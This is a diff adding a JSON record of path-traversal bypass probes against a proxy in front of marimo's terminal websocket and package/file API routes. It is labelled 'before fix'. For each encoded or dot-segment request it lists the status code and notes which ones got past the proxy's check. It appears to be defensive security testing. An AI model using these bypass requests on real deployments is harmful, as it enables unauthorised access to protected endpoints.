@@ -1,0 +1,367 @@
+{
+  "note": "raw socket, path as-is; 101/200 = reached marimo, 403/400/404 = stopped",
+  "cases": [
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "plain",
+      "request": "GET /e/terminal/ws",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "dot-dot",
+      "request": "GET /e/x/../terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "dot",
+      "request": "GET /e/./terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "double-slash",
+      "request": "GET /e//terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "upper-case",
+      "request": "GET /e/Terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "encoded-dotdot",
+      "request": "GET /e/%2e%2e/e/terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "x-encoded-dotdot",
+      "request": "GET /e/x/%2e%2e/terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "encoded-slash",
+      "request": "GET /e/x/..%2fterminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "pct-letter",
+      "request": "GET /e/%74erminal/ws",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "e",
+      "variant": "encoded-dot-single",
+      "request": "GET /e/%2e/terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "plain",
+      "request": "GET /e/api/packages/list",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "dot-dot",
+      "request": "GET /e/x/../api/packages/list",
+      "status_line": "HTTP/1.1 200 OK",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "double-slash",
+      "request": "GET /e//api/packages/list",
+      "status_line": "HTTP/1.1 404 Not Found",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "upper-case",
+      "request": "GET /e/API/packages/list",
+      "status_line": "HTTP/1.1 404 Not Found",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "encoded-dotdot",
+      "request": "GET /e/x/%2e%2e/api/packages/list",
+      "status_line": "HTTP/1.1 200 OK",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "encoded-slash",
+      "request": "GET /e/x/..%2fapi/packages/list",
+      "status_line": "HTTP/1.1 200 OK",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "pct-letter",
+      "request": "GET /e/%61pi/packages/list",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "blocked by egret",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "trailing-dot-seg",
+      "request": "GET /e/api/packages/x/../list",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "blocked by egret",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "dot-dot POST files",
+      "request": "POST /e/x/../api/files/list_files",
+      "status_line": "HTTP/1.1 401 Unauthorized",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "e",
+      "variant": "plain POST files",
+      "request": "POST /e/api/files/list_files",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "blocked by egret",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "plain",
+      "request": "GET /r/terminal/ws",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "dot-dot",
+      "request": "GET /r/x/../terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "dot",
+      "request": "GET /r/./terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "double-slash",
+      "request": "GET /r//terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "upper-case",
+      "request": "GET /r/Terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "encoded-dotdot",
+      "request": "GET /r/%2e%2e/r/terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "x-encoded-dotdot",
+      "request": "GET /r/x/%2e%2e/terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "encoded-slash",
+      "request": "GET /r/x/..%2fterminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "pct-letter",
+      "request": "GET /r/%74erminal/ws",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "ws",
+      "prefix": "r",
+      "variant": "encoded-dot-single",
+      "request": "GET /r/%2e/terminal/ws",
+      "status_line": "HTTP/1.1 101 Switching Protocols",
+      "body_head": "",
+      "ws_after_handshake": "server closed connection; 0 bytes after handshake: "
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "plain",
+      "request": "GET /r/api/packages/list",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "dot-dot",
+      "request": "GET /r/x/../api/packages/list",
+      "status_line": "HTTP/1.1 401 Unauthorized",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "double-slash",
+      "request": "GET /r//api/packages/list",
+      "status_line": "HTTP/1.1 404 Not Found",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "upper-case",
+      "request": "GET /r/API/packages/list",
+      "status_line": "HTTP/1.1 404 Not Found",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "encoded-dotdot",
+      "request": "GET /r/x/%2e%2e/api/packages/list",
+      "status_line": "HTTP/1.1 401 Unauthorized",
+      "body_head": "2a\r\n{\"detail\":\"Authorization header required\"}\r\n",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "encoded-slash",
+      "request": "GET /r/x/..%2fapi/packages/list",
+      "status_line": "HTTP/1.1 401 Unauthorized",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "pct-letter",
+      "request": "GET /r/%61pi/packages/list",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "trailing-dot-seg",
+      "request": "GET /r/api/packages/x/../list",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "blocked by egret",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "dot-dot POST files",
+      "request": "POST /r/x/../api/files/list_files",
+      "status_line": "HTTP/1.1 401 Unauthorized",
+      "body_head": "",
+      "ws_after_handshake": ""
+    },
+    {
+      "kind": "http",
+      "prefix": "r",
+      "variant": "plain POST files",
+      "request": "POST /r/api/files/list_files",
+      "status_line": "HTTP/1.1 403 Forbidden",
+      "body_head": "",
+      "ws_after_handshake": ""
+    }
+  ],
+  "ws_note": "Every 101 above is the PROXY accepting: its check passed, then websockets.connect to upstream raised InvalidStatus (56 'server rejected WebSocket connection' in proxy.log) because the websockets client sends the dot path as-is and marimo has no such route. So the WS check is bypassed but no shell was reached in these variants; HTTP is the exploitable path (httpx collapses dot segments after the check): 200 with the package list for /e/x/../api/packages/list, %2e%2e and ..%2f variants. POST variants got 401 'Missing server token' FROM MARIMO (reached it; a real author has the Marimo-Server-Token from the served page).",
+  "phase": "before fix"
+}
